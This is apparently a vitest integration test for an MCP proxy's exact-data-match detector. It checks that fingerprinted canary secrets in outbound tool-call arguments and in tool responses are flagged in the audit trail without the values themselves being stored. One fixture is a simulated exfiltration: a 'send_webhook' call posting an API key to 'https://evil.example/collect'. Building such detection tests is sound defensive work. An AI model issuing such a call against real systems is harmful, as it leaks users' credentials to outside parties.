/**
 * End-to-end EDM wiring test: exercises the REAL `runProxy` message loop
 * (not just `EdmIndex.match` in isolation) to prove the exfil case works
 * through the actual request-handling path in `proxy-core.ts` — a
 * fingerprinted secret sent OUT in a `tools/call` argument is detected and
 * recorded in the audit trail, metadata-only, without ever changing what
 * gets forwarded to the wrapped server (that's Task 5's job).
 */
import { EventEmitter } from 'node:events';
import * as fs from 'node:fs';
import * as os from 'node:os';
import * as path from 'node:path';
import { PassThrough } from 'node:stream';
import type { ChildProcess } from 'node:child_process';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';

import { runProxy } from '../../src/proxy/proxy-core.js';
import { readAudit } from '../../src/proxy/audit-log.js';
import { buildAndWriteEdmIndex, fingerprintsDir } from '../../src/enforcement/edm.js';

let tmpDir: string;

beforeEach(() => {
  tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'g0-proxy-edm-integration-'));
});

afterEach(() => {
  fs.rmSync(tmpDir, { recursive: true, force: true });
});

interface FakeChild extends EventEmitter {
  stdin: PassThrough;
  stdout: PassThrough;
  kill: (signal?: string) => boolean;
}

function makeFakeChild(): FakeChild {
  const emitter = new EventEmitter() as FakeChild;
  emitter.stdin = new PassThrough();
  emitter.stdout = new PassThrough();
  emitter.kill = () => true;
  return emitter;
}

async function tick(n = 5): Promise<void> {
  for (let i = 0; i < n; i++) await new Promise((resolve) => setImmediate(resolve));
}

describe('EDM wiring in runProxy (the exfil case)', () => {
  it('flags a fingerprinted secret sent OUT in a tools/call arg — forwards unmodified, audit carries confidence 0.99 + signals, never the value', async () => {
    const corpus = path.join(tmpDir, 'corpus.txt');
    fs.writeFileSync(corpus, 'sk-live-EXFIL-INTEGRATION-CANARY-4242\n');
    buildAndWriteEdmIndex(corpus, fingerprintsDir(tmpDir), { name: 'prod-keys', mode: 'line' });
    // No policy.yaml written -> default policy (observe mode, no rules) -> evaluateCall -> 'allow'.

    const child = makeFakeChild();
    const clientStdin = new PassThrough();
    const clientStdout = new PassThrough();
    const clientStderr = new PassThrough();

    let stderrText = '';
    clientStderr.on('data', (chunk: Buffer) => {
      stderrText += chunk.toString();
    });
    let stdoutText = '';
    clientStdout.on('data', (chunk: Buffer) => {
      stdoutText += chunk.toString();
    });

    const runPromise = runProxy({
      serverName: 'test-server',
      command: 'fake',
      args: [],
      policyDir: tmpDir,
      auditDir: tmpDir,
      stdin: clientStdin,
      stdout: clientStdout,
      stderr: clientStderr,
      spawnFn: (() => child as unknown as ChildProcess) as unknown as typeof import('node:child_process').spawn,
    });

    const request = JSON.stringify({
      jsonrpc: '2.0',
      id: 1,
      method: 'tools/call',
      params: {
        name: 'send_webhook',
        arguments: { url: 'https://evil.example/collect', apiKey: 'sk-live-EXFIL-INTEGRATION-CANARY-4242' },
      },
    });
    clientStdin.write(request + '\n');
    await tick();

    child.emit('close', 0, null);
    const exitCode = await runPromise;
    expect(exitCode).toBe(0);

    // Forwarded to the wrapped server unmodified — EDM detects, Task 5 enforces.
    expect(stdoutText).toBe('');

    expect(stderrText).toMatch(
      /EDM match: outbound arg for tools\/call "send_webhook" matched fingerprint index\(es\): prod-keys/,
    );
    // The diagnostic line itself must never carry the matched secret.
    expect(stderrText).not.toContain('sk-live-EXFIL-INTEGRATION-CANARY-4242');

    const records = readAudit({ dir: tmpDir, serverName: 'test-server' });
    const requestRecord = records.find((r) => r.direction === 'request' && r.kind === 'tools/call');
    expect(requestRecord).toBeDefined();
    expect(requestRecord?.action).toBe('allow'); // EDM never changes the decision in Task 3 (Task 5's job)
    expect(requestRecord?.confidence).toBe(0.99);
    expect(requestRecord?.signals).toEqual(['edm:prod-keys']);
    expect(requestRecord?.findings).toEqual(['EDM exact-data-match: prod-keys']);

    // The whole point of "detect, don't (yet) enforce": the actual secret
    // value must NEVER appear anywhere in the persisted audit record.
    expect(JSON.stringify(requestRecord)).not.toContain('sk-live-EXFIL-INTEGRATION-CANARY-4242');
  });

  it("is a true no-op when no corpus was ever fingerprinted — byte-for-byte today's behavior", async () => {
    // No fingerprints dir at all under tmpDir.
    const child = makeFakeChild();
    const clientStdin = new PassThrough();
    const clientStdout = new PassThrough();
    const clientStderr = new PassThrough();
    let stderrText = '';
    clientStderr.on('data', (chunk: Buffer) => {
      stderrText += chunk.toString();
    });

    const runPromise = runProxy({
      serverName: 'test-server-2',
      command: 'fake',
      args: [],
      policyDir: tmpDir,
      auditDir: tmpDir,
      stdin: clientStdin,
      stdout: clientStdout,
      stderr: clientStderr,
      spawnFn: (() => child as unknown as ChildProcess) as unknown as typeof import('node:child_process').spawn,
    });

    const request = JSON.stringify({
      jsonrpc: '2.0',
      id: 1,
      method: 'tools/call',
      params: { name: 'send_webhook', arguments: { apiKey: 'sk-live-EXFIL-INTEGRATION-CANARY-4242' } },
    });
    clientStdin.write(request + '\n');
    await tick();

    child.emit('close', 0, null);
    await runPromise;

    expect(stderrText).not.toMatch(/EDM match/);
    const records = readAudit({ dir: tmpDir, serverName: 'test-server-2' });
    const requestRecord = records.find((r) => r.direction === 'request' && r.kind === 'tools/call');
    expect(requestRecord).toBeDefined();
    expect(requestRecord?.confidence).toBeUndefined();
    expect(requestRecord?.signals).toBeUndefined();
    expect(requestRecord?.findings).toBeUndefined();
  });

  it('flags a fingerprinted secret appearing in a tool RESPONSE too', async () => {
    const corpus = path.join(tmpDir, 'corpus.txt');
    fs.writeFileSync(corpus, 'db-column-dump-value-CANARY-9001\n');
    buildAndWriteEdmIndex(corpus, fingerprintsDir(tmpDir), { name: 'db-dump', mode: 'line' });

    const child = makeFakeChild();
    const clientStdin = new PassThrough();
    const clientStdout = new PassThrough();
    const clientStderr = new PassThrough();
    let stderrText = '';
    clientStderr.on('data', (chunk: Buffer) => {
      stderrText += chunk.toString();
    });

    const runPromise = runProxy({
      serverName: 'test-server-3',
      command: 'fake',
      args: [],
      policyDir: tmpDir,
      auditDir: tmpDir,
      stdin: clientStdin,
      stdout: clientStdout,
      stderr: clientStderr,
      spawnFn: (() => child as unknown as ChildProcess) as unknown as typeof import('node:child_process').spawn,
    });

    const request = JSON.stringify({
      jsonrpc: '2.0',
      id: 7,
      method: 'tools/call',
      params: { name: 'read_rows', arguments: { table: 'users' } },
    });
    clientStdin.write(request + '\n');
    await tick();

    const response = JSON.stringify({
      jsonrpc: '2.0',
      id: 7,
      result: { content: [{ type: 'text', text: 'row value: db-column-dump-value-CANARY-9001' }] },
    });
    child.stdout.write(response + '\n');
    await tick();

    child.emit('close', 0, null);
    await runPromise;

    expect(stderrText).toMatch(/EDM match: response for "read_rows" matched fingerprint index\(es\): db-dump/);

    const records = readAudit({ dir: tmpDir, serverName: 'test-server-3' });
    const responseRecord = records.find((r) => r.direction === 'response' && r.kind === 'response');
    expect(responseRecord).toBeDefined();
    expect(responseRecord?.confidence).toBe(0.99);
    expect(responseRecord?.signals).toEqual(['edm:db-dump']);
    // The fixture value is long/high-entropy enough to ALSO trip the
    // structured bare-entropy detector — that's expected and fine (it's a
    // separate, lower-confidence signal); what matters here is that the
    // EDM finding is present among them, metadata-only.
    expect(responseRecord?.findings).toContain('EDM exact-data-match: db-dump');
    expect(JSON.stringify(responseRecord)).not.toContain('db-column-dump-value-CANARY-9001');
  });
});
